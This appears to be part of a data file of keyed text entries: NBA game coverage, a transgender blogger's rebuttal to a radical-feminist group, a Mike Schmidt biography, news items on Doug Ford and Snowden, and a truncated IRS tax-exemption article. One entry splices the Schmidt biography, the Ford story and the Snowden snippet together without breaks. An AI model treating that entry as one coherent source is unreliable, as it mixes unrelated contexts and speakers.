  "latent_27554": "Preview | Recap | Notebook\n\nNets-Bobcats Preview\n\nBy JEFF MEZYDLO\n\nPosted Mar 03 2012 3:10PM An inability to string together wins continues to frustrate the New Jersey Nets. A visit to Charlotte could help them begin a run in a positive direction. The Nets look to bounce back from their latest defeat and hand the lowly Bobcats an eighth consecutive home loss Sunday night. New Jersey (11-26) has alternated wins and losses over its last six contests following a season-high eight-game skid. While the Nets' last three victories came against Chicago, New York and Dallas, they've been unable to build on any of those impressive performances in their next contest. They have posted back-to-back victories once this season. Coming off a 93-92 road win over the Mavericks on Tuesday, New Jersey took a step back with a 107-94 loss at Boston on Friday. The Nets went 5 for 19 from 3-point range and committed 20 turnovers while allowing the aging Celtics to shoot 51.7 percent. \"We've had a history of having a really good win and then following it up with a very bad loss,\" point guard Deron Williams said. \"We're very inconsistent as a team right now.\" New Jersey hopes to start building some consistency in Charlotte, where the Bobcats (4-30) have dropped a franchise-record seven straight at home. The Nets won their last visit to Charlotte, 94-89 on Feb. 11, 2011, and they took the only meeting this season as MarShon Brooks scored 20 points in a 97-87 home win Jan. 22. Teammate Brook Lopez missed that game while recovering from a stress fracture in his foot, and the Bobcats should be concerned about seeing him in the rematch. Lopez had 38 points in his third game of the season Tuesday, then scored 28 on Friday. He's scored 31 in each of his last two games against the Bobcats, and could be in for another big night if Charlotte starting center Bismack Biyombo misses a second straight contest with a shoulder injury. As Lopez has emerged, Williams has quieted down. He's been held to 12 points in each of the last two games after averaging 28.3 in the previous seven. The Bobcats have struggled offensively all season, averaging an NBA-low 86.3 points. They were held below 80 for the 11th time this season and shot 37.3 percent in a 102-72 loss at San Antonio on Friday, their fourth straight defeat. The starting backcourt of Gerald Henderson and D.J. Augustin combined for 10 points on 5-of-21 shooting. Charlotte went 3 of 16 from 3-point range. \"I just think as a group we're not shooting the ball well at all,\" said Corey Maggette, who was 4 of 12 from the field. \"We've got to be a better shooting team.\" Augustin is shooting 26.8 percent during the four-game skid. Rookie Kemba Walker has shot 10 for 30 over the last three. The Bobcats have made 38.4 percent overall during the seven-game skid at Charlotte Arena while being outscored by an average of 17.6 points. They're 2-12 at home. Henderson, who averages a team-leading 14.6 points, has totaled 21 in two games since missing nine with a hamstring injury.\n\nCopyright 2012 by STATS LLC and Associated Press.

(AP) Deron Williams' eyes grew a little wider when he realized the Charlotte Bobcats had opted not to double-team him off pick and rolls. It's something he hadn't seen all season. \"I'm used to getting double-teamed on those,\" Williams said. \"It's kind of refreshing not to be.\" Williams took full advantage, scoring a franchise-record 57 points to lift the New Jersey Nets to a 104-101 victory over the Bobcats on Sunday night. That's the most points scored in the NBA this season and breaks the team record of 52 points shared by Mike Newlin and Ray Williams. It was the second-most points scored against the Bobcats, one shy of Kobe Bryant's 58 in 2006. Williams, who came into the game averaging 21.7 points per game, shot 16 of 29 from the field and was a perfect 21 for 21 from the free-throw line. He did miss one at one free throw, but the Bobcats were called for a lane violation and it didn't count. Williams was surprised when a teammate told him he had 39 points at the end of the third quarter, three shy of his personal career-best set April 6, 2010, against Oklahoma City. \"You really don't pay attention to it,\" Williams said. \"It's just one of those games where you start feeling good and let it go.\" Coach Avery Johnson called Williams' effort unbelievable. \"He really was focused,\" Johnson said. \"He was well-rested. He made a lot of shots yesterday in our mini-practice and it carried over into tonight's game. We were going back and forth on whether to have a shootaround this morning and we opted for rest. And he was pretty fresh.\" Added teammate Sheldon Williams: \"When someone is hitting like that you want to keep going to the well until it runs dry. It never did tonight.\" However, not all went right for the Nets on this night as starting center Brook Lopez rolled his right ankle and left the locker room on crutches. Lopez, who made his season debut on Feb. 19 after missing the Nets' first 32 games while recovering from a broken right foot, had an X-ray but will be reevaluated on Monday, according to Johnson. \"It's a tough situation for him, especially coming back from the foot situation,\" Johnson said. \"We're going to get him checked out tomorrow. We'll know more when we find out.\" Afterward, Bobcats coach Paul Silas wasn't apologizing for his team's approach to defending Williams with one man. \"You can do one of two things: you can try to stop him and double him and leave other players wide open or guard everybody,\" Silas said. \"I thought that's mainly what kept us in the game. Nobody else was doing anything (for them). It gave us a chance.\" Corey Maggette had 24 points and Gerald Henderson added 15 for the Bobcats, who've now lost five straight and 21 of their last 22. The Nets trailed by eight at halftime but took the lead thanks to Williams, who scored 22 points in the third quarter when he simply dominated Charlotte's smaller guards D.J. Augustin and Kemba Walker. Williams did just about everything right, adding six rebounds and seven assists. He also converted a four-point play after getting fouled while knocking down a 3-pointer from the wing. With the Nets leading 96-94 with 1:04 remaining, Kris Humphries missed two free throws but Sheldon Williams got a key momentum-turning rebound and called timeout. Deron Williams hit a big jumper to give the Nets a four-point lead and Sheldon Williams followed by converting a three-point play off a pretty pass from Jordan Farmar. The Bobcats would cut the lead to two with 3.5 seconds left, but MarShon Brooks knocked down one of two free throws with 1.7 seconds left. The Bobcats had a final chance to tie the game but Augustin's off-balanced heave from 20 feet didn't hit the rim. \"We didn't give up,\" Silas said. \"That was a great thing. In the last 1.7 seconds, we didn't execute that play particularly well. But we did have a chance. That shows me that we are getting there. It's certainly not there yet. But we are striving to get there. At least we're not just giving up and letting teams just run over us. If we continue to do this, we'll be OK.\" The Nets got 11 points and 13 rebounds from Humphries to win their 12th game this season. The Bobcats led by as many as 16 in the first half, the first time they've held a double-digit lead since Feb. 4 at Phoenix. Walker had 14 points and Augustin and Byron Mullens each added 12 for the Bobcats. NOTES: The Bobcats, who have the NBA's worst record, scored 100 points for the first time in 22 games. They hadn't reached that feat since scoring 112 in a win against Golden State on Jan. 14 which was the beginning of their season downfall.\n\nCopyright 2012 by STATS LLC and Associated Press.

Williams had a career-high 57 points, six more than Kevin Durant's previous season-best mark. He went 16-29 from the floor, hit four 3-point buckets and was a perfect 21-21 from the foul line. Williams tallied 22 points in the third quarter alone, which allowed the Nets to rally from an eight-point halftime deficit. The Nets built a 101-94 lead with 37 seconds remaining but had to sweat out the final seconds as D.J. Augustin's long-distance three-pointer failed at the buzzer. QUOTABLE: \"I think we're a much better team when Deron's aggressive. We're going to be a much better team not only when Brook (Lopez) scores but when Deron scores the basketball.\"\n\n-- Nets coach Avery Johnson prior to the game THE STAT: The 57 points scored by Williams was the second-most ever against the Bobcats. Kobe Bryant put up 58 against Charlotte on December 29, 2006. TURNING POINT: The Bobcats had a 16-point lead late in the second quarter, which the Nets whittled down to nine at the half. When Kemba Walker came on after Augustin picked up his fourth foul with 7:03 remaining in the third quarter, Williams scored the next 15 points for New Jersey, giving the visitors a five-point lead. INSIDE THE ARENA: Walker came onto the court late in the first quarter wearing neon-orange shoes. ROOKIE WATCH: Walker scored 14 points and was 8-8 from the free-throw line. NOTABLE: Williams' previous high for points this year was 38 points, which he eclipsed in the third quarter. His previous career-high was 42 points, which he netted on April 6, 2010 versus Oklahoma City. NOTABLE II: This was the first time in 21 games that the Bobcats reached triple-digits in points. UP NEXT: For the Bobcats, Tuesday vs. Magic, Wednesday vs Jazz, Friday vs. Nets. For the Nets, Tuesday @ Miami, Wednesday vs. Clippers, Friday at Charlotte.",
  "latent_27648": "I recently became aware of the RadFem group and their outspoken leader Cathy Brennan, who writes a blog over on Tumblr called Bugbrennan. If you have any idea what I’m talking about already, you know this isn’t going to be a “let’s buy these guys some milk and cookies” kind of post. At the same time, as tempted as I am to go all hissy fit on them, I’m going to try to look at this in a calm rational manner, with maybe just a tiny bit of humor thrown in. It’s all about getting a dialog started here people, and yes, I hope they find this and engage. Don’t worry, I’ll beat a path to my door.\n\nI have not had time to read the entire RadFem site, but one of the predominant themes is a palpable anti-transgender agenda. They appear to be working this pretty hard; a tireless dedication to blocking or reversing any gains in rights that we make. I found this pretty surprising to be honest. I mean, there really aren’t that many of us out there, and to have an organization dedicated in part to working against us seems fairly ridiculous. When there is so much work left to be done to advance the equality of women all over the world, spending this much time and energy to give a micro-population a really shitty time of it seems either mean in spirit, or there is something else going on entirely. I can’t quite pin down whether it’s a Westboro Baptist Church kind of thing, or a Larry Craig/ Mark Foley denial and lash out, but either way, it’s not making a lot of sense.\n\nI’m also not clear on the name choice. The ‘rad’ is for ‘radical’, as you may have well guessed. Generally speaking the population at large, especially those empowered to make any sort of policy decisions, typically eschew groups who actively promote that they are in fact radical. It has flair and is appropriately militant sounding, but downright horrible in the pursuit of any type of credibility whatsoever. It is comforting to know their stated goals are almost instantly thwarted by the name alone.\n\nIf I understand correctly, the end game for RadFem is to achieve unquestionable female equality in all areas, as well as promote the guarantee of female safety in society under all circumstances. I’m pretty sure that is something most women can get behind, including the trans population. For some reason, there seems to be a widespread belief among them that denying the existence of the trans population is a sure fire way to promote this. Yeah, I said the same thing. It’s sort of like being sent to prison and picking the weakest most pathetic inmate to beat up to establish dominance. I understand where they want to go, but they seem to be taking a very unnecessarily contentious way of getting there. There are a lot of sub themes to choose from, but I’m going to pick the two most prevalent to address.\n\nMs Bug et al take the line of David Hume style extreme rationalism. Born with penis = male, no exceptions. Binary logic is wonderful for running machines, but rarely applicable to the human experience. Exceptions are plentiful such as the intersex and other variations. I have not found evidence that there is clear consensus as to whether post operative transsexuals are still considered male by all or not. Either way, this simplistic world view either reflects the lack of ability to process complexity, or a convenient black and white rational to attack individuals who don’t fit a highly improbable binary model.\n\nI’ve also heard the argument from this camp that there is no medical evidence indicative of transsexuals having a brain structure more resembling that of the identified gender. This is very easy to look up by going here (you have to click the link). If you spend some time here, you will see many articles both for and against this hypothesis. The Wikipedia entry is also fairly accurate, though not comprehensive. It may well be that RadFem is taking the line that a lack of a clear ‘smoking gun’ proven causal link is firm evidence to the contrary, thus ignoring the basic principle of scientific investigation that requires a significant amount of data to achieve conclusive results. Not that many studies have been done to date in comparison to much better understood conditions. I would also like a clear, validated and independently replicable test that yielded yes/ no answers, but currently the study of transexualism is about where that of homosexuals was 50 years ago. The RadFem position is comparable to that of creationists who point to as yet undiscovered data points in the fossil record to argue evolution as an unlikely theory in simplistic protection of a highly biased world view.\n\nWhile the nitty-gritty of neural mapping remains fuzzy at present, there is conclusive evidence that a population exists wherein members recognize a core gender identity opposite to that their birth genitalia and hormonal function. Much like a Mac OS loaded on a PC, function will degrade rapidly (I know, I know, it’s an imperfect analogy). Hardware modification to resemble the hardware configuration of a Mac, however, will improve function dramatically. The transsexual population is in the same predicament. Unlike brain mapping studies that are still in infancy, there is a mountain of causal evidence that physical and social transition to a person’s core gender identity significantly improves overall functionality in spite of the enormous social, emotional, physical, and financial costs involved. To date it remains the only successful form of treatment. My point is that whatever the true root cause is, transsexuals are recognized as existing by every credible medical and scientific organization that possess the expertise to render a meaningful opinion. The end result of transition is a person who has a physical appearance that matches their gender identity. Philosophical disbelief in our verified existence does not provide a moral, legal, or social platform to ethically argue against equal rights.\n\nI think this brings us right to the bathroom issue. Yes, I’ve talked about this before, hence the handy link. I understand the RadFem position to be that the societal protection of women requires the establishment and enforcement of segregated space that is designated female only. Concerning this statement, in and of itself, we are in agreement. Regardless of individual RadFem member positions on “is it really a he or she?”, they take the further position that allowing access to female facilities invites male sex offenders to adopt a disguise and commit rapes in the ladies room, primarily because this has happened, though very sporadically and never by a trans person. Let’s talk about that for a second.\n\nThe discussion brings forth an image of several shady characters huddled around an old radio in an abandoned warehouse down by the docks, eagerly listening to see when GENDA finally passes. “All right boys, they passed it! Let’s strap on some heels and go hit the crappers!” The unlikely part of this scenario is the notion that scheming rapists are currently stymied only by the finer points of an equality law only applicable to a tiny segment of the population. If a rapist is inclined to do this, he is going to anyway regardless of what the law says. Furthermore, it can be argued that given rape is brutal hate crime to establish dominance in the form of forced sex, and that the vast majority of men find adopting female garb humiliating and emasculating, it is further unlikely that the incidence rate of this heinous sort of thing is going to increase. From that it comes down to the fact that some females are uncomfortable sharing facilities with transgender women either due to fear based on misunderstanding or inherent prejudice.\n\nHere are the facts of the matter succinctly. Cisgender women are not at risk from transgender women. There has not been a single recorded instance of a transgender woman acting inappropriately in a female only facility. Like everyone else, we just want to pee, check our make up, and leave without hassle. Transgender women, however, are at significant risk of physical and sexual abuse in a male only facility. Barring transgender women from female only facilities is directly comparable to barring African-American women on the basis of fear based on prejudice and misunderstanding. Forcing trans women into a situation of real documented risk in order to cater to prejudicial fears based on a lack of understanding is unconscionable. Furthermore, due to the risks involved to our well being, trans women have and will continue to use female only facilities. We are humans with physical needs, identify entirely with the gender the segregated facility is for, and must look after our personal safety. Attempting to block passage of equality laws is not going to change this.\n\nI do understand this is a difficult issue overall. I do acknowledge that risk of abuse exists and I am personally concerned about it myself, as are we all. I also understand that there is no clear means of telling the difference between a post-op transsexual, pre-op transsexual, cross-dresser, or drag queen without utilizing personally invasive means. I would, however, vastly prefer to work together to discover and implement mutually acceptable solutions designed to safeguard the well being of all women. This makes much more sense to me than expending considerable time and energy fighting a battle that ultimately benefits none, and puts some at risk.\n\nYou all may notice that in spite of getting a little contentious at times and drawing from unsavory or exaggerated examples and comparisons to drive the point home, I kept this much less provocative then I was originally inclined. I would like to urge my trans friends and trans allies to resist escalating the battle. I would like to see if a dialog can be established and foster communication to see if common ground or a common cause can be found.",
  "latent_27651": "Michael Jack Schmidt (born September 27, 1949) is an American former professional baseball third baseman who played 18 seasons in Major League Baseball (MLB) for the Philadelphia Phillies. Schmidt was a twelve-time All-Star and a three-time winner of the National League (NL) Most Valuable Player award (MVP), and he was known for his combination of power hitting and strong defense: as a hitter, he compiled 548 home runs and 1,595 runs batted in (RBIs), and led the NL in home runs eight times and in RBIs four times. As a fielder, Schmidt won the National League Gold Glove Award for third basemen ten times. Schmidt was elected to the Baseball Hall of Fame in 1995 and is often considered the greatest third baseman in baseball history.[1][2]\n\nHaving an unusual batting stance, Schmidt turned his back somewhat towards the pitcher and rocked his rear end back-and-forth while waiting for a pitch. By standing far back in the batter's box, he made it almost impossible to jam him by pitching inside. Schmidt was one of the best athletes of his era; teammate Pete Rose once said, \"To have his body, I'd trade him mine and my wife's, and I'd throw in some cash.\"[3]\n\nEarly life [ edit ]\n\nMike Schmidt's parents are Joseph Jack Schmidt and Lois Jane Philipps. They managed the Philipps Aquatic Club founded by Lois' great grandfather Charles A. Philipps. Mike was a lifeguard at the club.[4]\n\nAmateur baseball career [ edit ]\n\nUpon graduation from Fairview High School in Dayton, Ohio in 1967, Schmidt attended Ohio University in Athens, where he joined Beta Theta Pi fraternity.[5] He led the Ohio Bobcats baseball team to the College World Series in 1970,[6] and was selected as the shortstop for the 1970 College Baseball All-America Team. Schmidt was drafted by the Phillies in the second round (30th overall) of the 1971 Major League Baseball draft.\n\nProfessional baseball career [ edit ]\n\nMinor Leagues [ edit ]\n\nOn June 11, 1971, Schmidt was signed by Phillies scout Tony Lucadello, who had followed him since he played Little League Baseball.[7] Six days later, Schmidt made his professional debut in an exhibition game between the Phillies and their Double-A affiliate the Reading Phillies in Reading, Pennsylvania. Schmidt played the whole game at shortstop for the big-league Phillies, hitting a game-winning home run against his future Reading teammates.[8] Schmidt stayed in Reading, spending the rest of the 1971 season at the Double-A level. In 1972, he was promoted to the Triple-A Eugene Emeralds of the Pacific Coast League. Along with shortstop and third base, Schmidt also played second base during his time in the minor leagues.\n\nMajor Leagues [ edit ]\n\nSchmidt spent two seasons in the Phillies' farm system, where he batted .263 with 34 home runs and 122 runs batted in. After playing most of the 1972 season for Triple-A Eugene, he was called up to the Phillies in September, and made his major league debut against the New York Mets on September 12.[9] Four days later, in Philadelphia on September 16, Schmidt ended Montreal Expos pitcher Balor Moore's streak of 25 scoreless innings pitched with his first career home run.[10]\n\nFollowing the 1972 season, the Phillies dealt third baseman Don Money to the Milwaukee Brewers to open a spot for Schmidt in their infield. While he batted only .196 with 136 strikeouts during his first full season in 1973, Schmidt demonstrated his power potential by hitting 18 home runs.\n\nThe next year, 1974, Schmidt's batting average climbed to .282 and he received the first of his twelve All-Star nods.[11] On June 10, in the Astrodome in Houston, Texas, Schmidt hit a ball off Houston Astros' pitcher Claude Osteen that looked like a sure home run. The ball hit a public address speaker suspended 117 feet above and 329 feet away from home plate, falling into center field. By the ground rules, it remained in play and Schmidt was held to just a single, with the runners on first and second each advancing just one base. It is believed that had the ball not hit the speaker, it would have traveled beyond 500 feet.[12] For the season, Schmidt finished sixth in National League Most Valuable Player balloting as he batted .282 with 116 RBIs and a league-leading 36 home runs to help the Phillies avoid a last-place finish in the National League East for the first time since 1970. His 404 assists in 1974 remains a record for third basemen. He also filled in at shortstop and first base.\n\nSchmidt's batting average hovered below .200 through May 1975. Solid months of July and August saw his average rise to .249 by the end of the season as he led the league in home runs for the second year in a row, with 38. Schmidt started the 1976 season by hitting twelve home runs in Philadelphia's first fifteen games, including four in one game on April 17,[13] becoming the 10th player in major league history to accomplish that feat. For the season, Schmidt drove in 107 runs, and led the league in home runs for the third year in a row (38), and won his first of ten Gold Gloves to lead the Phillies to their first division crown since division play started in 1969.\n\nThe Phillies captured the NL East crown three years in a row; however, they were swept by Cincinnati's \"Big Red Machine\" in 1976, and lost to the Los Angeles Dodgers in 1977 and 1978. On December 5, 1978, the Phillies signed Pete Rose as a free agent, temporarily making Rose the highest-paid athlete in team sports with a four-year, $3.2-million contract. With Rose on board, the Phillies were early favorites to repeat as division winners in 1979.[citation needed] Instead, the Phillies finished the season at 84–78, and in fourth place in NL East. For his part, Schmidt broke the club record for home runs in a season with 45, eclipsing Chuck Klein's 43 hit in 1929.\n\nOn October 3, 1980, the Phillies went into Montreal tied with the Expos for first place in the NL East. With a sacrifice fly in the first, and a solo home run in the sixth, Schmidt led the Phillies to a 2–1 victory to capture first place.[14] A day later, Schmidt hit his 48th home run of the season in the 11th inning to give the Phillies the 6–4 extra innings victory over the Expos, and clinch the division.[15] His 48 home runs broke his own team record, and led the National League by a margin of thirteen over his nearest competitor. Coupled with a league-leading 121 RBIs, Schmidt was a unanimous choice for the National League's Most Valuable Player Award.\n\nThe Phillies defeated the Houston Astros in the 1980 National League Championship Series[16] to reach the World Series for the third time in franchise history. Though Schmidt had just a career .191 post-season batting average with no home runs and five RBIs, his bat came alive in the 1980 World Series, hitting two homers and driving in seven runs against the Kansas City Royals. The Phillies beat the Royals in six games to win the first World Series in franchise history, and Schmidt won the World Series MVP Award. Following the World Series, Schmidt and four of his Phillies teammates appeared on Family Feud for one week in 1980. He, Larry Bowa, Garry Maddox, Dick Ruthven and Del Unser took on five members of the Kansas City Royals: Dennis Leonard, Dan Quisenberry, Paul Splittorff, John Wathan and Willie Wilson.\n\nSchmidt's best season may have been the strike-shortened 1981 season. His 31 home runs were seven more than anyone else in the league. He also led the NL in runs scored, RBIs, total bases and walks, and set personal highs in batting average, on-base percentage and slugging percentage. He won his second consecutive MVP award, this time with 96% of the vote.\n\nThe Phillies led the NL East by 3.5 games when the 1981 Major League Baseball strike hit. As a result, the Phillies were named NL East champions for the first half of the season; however, they lost to the second-half champion Montreal Expos in the 1981 National League Division Series.\n\nIn 1983, in celebration of the team's 100th anniversary, Schmidt was voted by fans the greatest player in the history of the franchise. That year, he led the league in home runs for the sixth time in his career to lead the Phillies back to the postseason. Schmidt led his team with a .467 batting average and scored five runs as they defeated the Los Angeles Dodgers in the 1983 National League Championship Series. It was, however, a much different story against the Baltimore Orioles in the 1983 World Series. The Phillies were held to a .195 team batting average; Schmidt went just 1-for-20 with a single.\n\nFollowing the 1983 season, Schmidt was awarded the Lou Gehrig Memorial Award. That off-season, Pete Rose left the Phillies as a free agent and signed with the Montreal Expos. With a hole at first base, the Phillies played Tim Corcoran and Len Matuszek in a platoon system during the 1984 season. Neither player provided the offensive spark Rose did, and so a change was in order. Early in the 1985 season, Schmidt agreed to move to first base (starting from late May) through the end of the season with Rick Schu assuming third base duties. The Phillies finished with a record below .500 for the first time since 1974.\n\nIn 1986, the Phillies moved outfielder Von Hayes to first base and shifted Schmidt back to third base. He responded by winning his third MVP award, a record for third basemen,[17] with a league-leading 37 home runs and 119 RBIs.\n\nSchmidt homers against the Reds on July 20, 1987, at the Vet\n\nTrailing the Pittsburgh Pirates 6–5 in the top of the ninth inning at Three Rivers Stadium on April 18, 1987, Schmidt hit his 500th career home run, a three-run shot off of Don Robinson. It put the Phillies in front 8–6, and ended up being the game-winner.[18]\n\nInjuries to Schmidt's rotator cuff caused him to miss the last month and a half of the 1988 season. He returned healthy for the 1989 season, however, after a poor start, Schmidt suddenly chose to announce his retirement in San Diego, on May 29. Although he typically demonstrated little emotion on the field (and was known as \"Captain Cool\" by many in Philadelphia sports circles), Schmidt surprised many with an emotional, and occasionally tearful, retirement speech. His last game was May 28, 1989, against the San Francisco Giants.[19]\n\nDespite his own perceived subpar start and subsequent retirement on May 29, fans once again voted Schmidt to be the starting third basemen for the NL All-Star team. He decided not to play, but he did participate in the game's opening ceremony in uniform.[20]\n\nCareer statistics [ edit ]\n\nGames PA AB Runs Hits 2B 3B HR RBI SB BB SO Avg. Slg. OBP OPS Fld% 2,404 10,062 8,352 1,506 2,234 408 59 548 1,595 174 1,507 1,883 .267 .527 .380 .908 .961\n\nOver his career, Schmidt set a vast array of hitting and fielding records. In addition to his MVP Awards, Schmidt won ten Gold Gloves, led the league in home runs eight times, in RBIs four times, OPS five times, and walks four times. He was named to twelve All-Star teams. He is the Phillies' all-time leader in games played, at-bats, plate appearances, runs scored, home runs, RBI, walks, strikeouts, total bases, runs created, sacrifice flies, outs, Adj. Batting Runs, Adj. Batting Wins, Extra Base Hits, Times On Base, and Power-Speed number. Schmidt's 548 home runs are the most ever hit by a player who spent his entire career with just one team.\n\nPost-playing career and accolades [ edit ]\n\nMike Schmidt's number 20 was retired by the Philadelphia Phillies in 1990.\n\nSchmidt opted, at first, to pursue a more private lifestyle after his career, rather than to become a manager or coach. He has written a number of articles on baseball for CBS and regularly participates in charity golf tournaments.\n\nThe Sporting News named Schmidt \"The Player of the Decade\" of the 1980s, in their January 29, 1990 issue.\n\nHis uniform number 20 was retired by the Phillies before a game at Veterans Stadium on May 26, 1990. That same season, Mike was inducted as a member of the Philadelphia Baseball Wall of Fame (he had previously been inducted as the third baseman for the Phillies' Centennial Team in 1983).\n\nIn 1991, he and Nolan Ryan were inducted into the Peter J. McGovern Little League Museum's Hall of Excellence (established in 1988), thereby becoming only the second and third MLB players inducted into the Hall.\n\nIn 1995 (on his first ballot), Schmidt was elected to the National Baseball Hall of Fame with what was at the time the fourth highest voting percentage ever, 96.52%.[21]\n\nIn 1997, Schmidt was elected as the starting third-baseman by the Baseball Writers' Association of America to the Major League Baseball All-Time Team. The event was celebrated at the 1997 Major League Baseball All-Star Game in Cleveland, Ohio.\n\nIn 1999, he ranked number 28 on The Sporting News's list of the 100 Greatest Baseball Players,[22] the highest-ranking third baseman, and the highest-ranking player whose career began after 1967. Later that year, he was elected to the Major League Baseball All-Century Team as the starting third-baseman. The event was celebrated at the 1999 Major League Baseball All-Star Game in Boston, Massachusetts.\n\nSchmidt was honored with a statue outside the third-base gate at Citizens Bank Park in 2004.\n\nOn September 27, 2006, Schmidt was announced as the Phillies representative for the DHL Hometown Heroes promotion, beating out Steve Carlton, Richie Ashburn, Robin Roberts and Chuck Klein as most outstanding player in the Phillies history.\n\nSchmidt returned to his alma mater, Ohio University, in October 2014 for the retirement of his number 10 by the Ohio University Baseball Team, which he led to the College World Series in 1970.\n\nOn July 14, 2015, Schmidt was named one of the Phillies \"Franchise Four\" as voted by the fans, along with Steve Carlton, Richie Ashburn and Robin Roberts.\n\nBaseball-Reference.com ranks Schmidt's mustache as the sixth-best in history.[23]\n\nSchmidt has publicly expressed his thoughts on various baseball controversies. He has been a vocal advocate for the reinstatement of Pete Rose to baseball. In July 2005, he appeared on Bob Costas' HBO show Costas Now to discuss steroids, and said, \"Let me go out on a limb and say that if I had played during that era I would have taken steroids... We all have these things we deal with in life, and I'm surely not going to sit here and say to you guys, 'I wouldn't have done that.'\" In his 2006 book, Clearing the Bases: Juiced Players, Monster Salaries, Sham Records, and a Hall of Famer's Search for the Soul of Baseball, he somewhat recanted that statement, saying that he understood the desire to get a competitive advantage even though he could not condone breaking the rules to do so.\n\nCoaching [ edit ]\n\nStarting in 2002, Schmidt works with the Phillies as a hitting coach during each Spring training. In October 2003, Schmidt was named the manager of the Phillies' Single A Florida State League affiliate, the Clearwater Threshers. He managed them for just the 2004 season, then resigned. In 2009, he served as third base coach for Team USA in the World Baseball Classic.\n\nPhilanthropy [ edit ]\n\nIn 2001, Schmidt began sponsoring an annual fishing tournament known as the Mike Schmidt Winner's Circle Invitational at Old Bahama Bay in West End, Grand Bahama Island. The first event raised $27,000, and has since raised over $1.5 million for cystic fibrosis.[24]\n\nIn 2008, Schmidt released a wine called Mike Schmidt 548 Zinfandel, a reference to his 548 career home runs, with proceeds also going to the Cystic Fibrosis Foundation.[25]\n\nBroadcasting [ edit ]\n\nNBC used Schmidt as a guest analyst (Marv Albert served as the pregame host) for Game 1 of the 1989 NLCS. Schmidt subsequently, did on-field reporting throughout the series. Schmidt also provided periodic commentary (albeit, taped prior to the playoffs) for ABC during the 1988 NLCS.\n\nSchmidt spent the 1990 season as a color analyst with the Phillies broadcast team on the now-defunct PRISM network, where he was partnered with play-by-play announcer Jim Barniak, and was known to be very candid and honest with his commentary.

Mr. Ford was filmed by a CBC television crew Wednesday night at a Toronto Community Housing building in his Etobicoke ward distributing toys and peeling off $20s from a stack in his hand for the crowd.\n\nMr. Ford – who has mused many times about running for provincial office – said Thursday when asked about the gifts that he is not running in the next municipal election. It's his choice, he said, about how he spends his money, explaining he handed out cash because he didn't have time to buy gift cards. He estimated he gave out about $200.\n\nStory continues below advertisement\n\n\"There's no difference in going to Tim Horton's, waiting in line and getting gift certificates,\" he told The Globe and Mail. \"I didn't have time. I went and bought toys for kids. The parents were standing there, so I gave them $20 to go buy themselves a coffee.\"\n\nLawyer John Mascarin, an expert in municipal law, said it is not an election period and there is nothing in the city's code of conduct that prohibits giving gifts – just accepting them.\n\nAsked if he plans to formally complain about Mr. Ford's actions, Mr. Perks said he could not even think of the right measure. \"It's so far outside of any civilized norm for government behaviour that I can't think of a mechanism that is an appropriate response,\" he said.\n\n\"It is fundamentally corrupt and corrupting,\" Mr. Perks said. \"One of the most dangerous things in a democracy is when elected officials use their money to try to win favour with the public. History has all kinds of examples of how bad things end up at the end of that road. I thought I had lost my capacity to be shocked by the Fords, but I'm shocked.\"\n\nMr. Ford said his brother Mayor Rob Ford did not need him to hand out gifts to get support in north Etobicoke. \"Everyone knows the Fords are not corrupt,\" Doug Ford said. \"Maybe rough around the edges. Maybe a lot of things. We are not corrupt.\"\n\nMr. Ford, who is an executive with the Ford's family business Deco Labels, is also offering $5,000 to help rejuvenate 10 parks in the city, donations he says he is free to make. \"He can say all he wants,\" he said, responding to Mr. Perks' objections. \"It's my choice.

A lot of people contemplate over whether he’s a patriot or a traitor, but the truth can only be found in his deeds.\n\nThe US government charged Mr Snowden with theft of government property, unauthorised invasion of communication, and wilful communication of classified information privy to the government. He’s known for acting uptight on the “right to information”, and that’s exactly what he did recently.\n\nDuring the Athens Democracy Forum at the National Library in Athens, Edward warned people and asked them not to use Google’s Allo- an instant mobile messaging app.\n\nSnowden claims that it allows the company to read and see everything that you share.\n\nWhat is #Allo?

  "latent_27759": "WASHINGTON -- For years, the IRS has done little or nothing to check the rise of overtly political groups that claim a special tax-exempt status in order to funnel secret money into election-related advertising.\n\nBut in a sign that the agency may be waking from its slumber, the IRS has sent detailed questionnaires to several Tea Party organizations -- and possibly other political groups -- to determine if they truly qualify for the 501(c)(4) designation intended for groups whose exclusive purpose is to promote social welfare.\n\nShould any group currently calling itself a 501(c)(4) have its designation denied or revoked, tax experts said the consequences could be severe, including fines of 35 percent or more of the money they raised in secret.\n\nAnd the groups might have to make donors' names public.\n\nEven loose talk about donor secrecy no longer being guaranteed could put a screaming halt to the extraordinary flow of money into these groups from deep-pocketed people and corporations that want to buy political ads without leaving fingerprints.\n\n\"If I thought it was important to remain anonymous for my business reasons or for my personal reasons, I wouldn't take any comfort in any assurances the organization has given me until now,\" said Karl Sandstrom, a former Federal Election Commission member who now works at the Washington office of law firm of Perkins Coie.\n\nIt’s not clear whether any of the major groups that identify themselves as C4s -- and are well on their way toward collecting and spending tens of millions of dollars in this election cycle -- have been the subject of IRS inquiries. The IRS won't say, and it’s apparently a sensitive topic with the groups. Representatives from Karl Rove-associated Crossroads GPS, Obama-backing Priorities USA, and several others didn't respond to requests for comment.\n\nBut, said Sandstrom: \"It's hard to imagine that the IRS would take the time to make inquiries of small organizations if there are very large organizations -- spending vast sums of money compared to these much smaller organizations -- that are not receiving similar attention.\"\n\nThe tax code requires 501(c)(4) groups to be operated \"exclusively\" for social welfare purposes -- which does not include intervention in political campaigns. The IRS has allowed the groups to engage in political activity as long as it was not their primary purpose. But for many of these groups, it's hard to see what other purpose they could possibly have.\n\nIt's also hard to see why a political group would file under section 501(c)(4) instead of under Section 527 -- the part of the tax code explicitly designed for political groups including PACs and super PACs -- other than to hide its donors. Like the C4s, the 527 groups are allowed to raise unlimited funds and pay no taxes. They just have to disclose who donates money.\n\nReform groups have been pressuring the IRS to enforce its rules for months. In February, a group of Democratic senators sent a letter to the IRS, which stated: \"It is contrary to the letter and spirit of the statute for political organizations formed primarily to advocate for a political candidate or to run attack ads against other candidates to take advantage of section 501(c)(4).\"\n\nSen. Tom Udall (D-N.M.), one the letter’s signers, praised the IRS inquiry. \"The term 'social welfare organization' is clearly being used loosely these days,” Udall said in a statement. “Voters deserve to know who's behind the attack ads they see on TV and we need a multi-pronged approach to get there -- a tightening of regulations, disclosure legislation from Congress, and ultimately, a constitutional amendment to reduce the influence of money in our elections.\"\n\nMeanwhile, a conservative legal organization representing several Tea Party groups assailed what it says \"appears to be a coordinated attempt by the Internal Revenue Service to intimidate and silence these organizations in this election year.\"\n\nThe Tea Party groups released IRS questionnaires that requested detailed information, including lists of people invited to speak at events, their credentials, and hard copies of all handouts.\n\n\"The problem here is the IRS has gone beyond legitimate inquiries and is 